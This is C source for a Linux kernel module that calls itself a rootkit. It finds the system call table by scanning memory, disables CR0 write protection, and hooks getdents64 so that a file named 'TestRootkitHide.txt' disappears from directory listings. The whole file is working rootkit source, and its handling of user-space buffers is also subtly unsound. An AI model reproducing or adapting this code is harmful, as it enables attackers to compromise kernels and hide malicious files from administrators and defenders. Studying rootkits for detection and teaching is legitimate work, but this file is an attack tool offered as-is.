#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h> 

/*************** Module description ********************/
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Xincheng Yang");
MODULE_DESCRIPTION("Rootkit main entry"); 

/*************** Methods declaration ********************/
// Hook system call table and hide file by name
static unsigned long **hook_syscall_table(void);
static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count);
// Kernel system call
asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
// Hooked system call
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);

/*************** What file we gonna hide ********************/
#define targetfile "TestRootkitHide.txt"

/*
 * Disable write protection for hook system call table
 */
#define DISABLE_WRITE_PROTECTION (write_cr0(read_cr0() & (~ 0x10000)))
#define ENABLE_WRITE_PROTECTION (write_cr0(read_cr0() | 0x10000))
asmlinkage unsigned long **syscall_table;
 
static int lkm_init(void)
{
    printk("Hello world, our rootkit(hide a file) module successfully loaded\n");
    syscall_table = hook_syscall_table();
    
    DISABLE_WRITE_PROTECTION;
    kernel_getdents64 = (void *)syscall_table[__NR_getdents64]; 
    syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
    ENABLE_WRITE_PROTECTION;
    
    return 0;    
}

/**
 * @brief This is the function to hook system call table
 * Before replace the original system call, we need to disable the system call table write protection.
 * @return the entry(array) of system call table
 */
unsigned long ** hook_syscall_table(void)
{
    unsigned long **entry = (unsigned long **)PAGE_OFFSET;

    for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
        if (entry[__NR_close] == (unsigned long *)sys_close) {
            return entry;
        }
    }

    return NULL;
}

/**
 * @brief Hide a specified file use linux_dirent
 * @param f_name : the file we want to hide 
 * @param dirp : the structure dirent which point to a specified file(inode) 
 * @param count : the size of this structure
 * @return 
 */
static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count)
{
    struct linux_dirent64 *dp;
    long cur_addr, cur_reclen, size, next_addr;
    
    for (cur_addr = 0; cur_addr < count; cur_addr += dp->d_reclen) {
        dp = (struct linux_dirent64 *)((char *)dirp + cur_addr);
        
        if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
            printk("Hide %s file success.\n", dp->d_name);
            
            cur_reclen = dp->d_reclen;                              // Store the current dirent length
            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
            
            memmove(dp, (void *)next_addr, (unsigned long)dirp + count - next_addr); 
            count -= cur_reclen;                                    // Modify the count
        }
    }

    return count;
}

/**
 * @brief A hooked getdents64 for hide the file from filesystem
 * @param fd
 * @param count
 * @return 
 */
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
{
    long rv;
    
    rv = kernel_getdents64(fd, dirp, count);
    rv = hide_file64(targetfile, dirp, rv);
    
    return rv;
}
 
static void lkm_exit(void)
{
    printk("Hello world, our rootkit module removed\n");
    
    // Recover the original system call setting
    DISABLE_WRITE_PROTECTION;
    syscall_table[__NR_getdents64] = (unsigned long *)kernel_getdents64;
    ENABLE_WRITE_PROTECTION;
}
 
module_init(lkm_init);
module_exit(lkm_exit);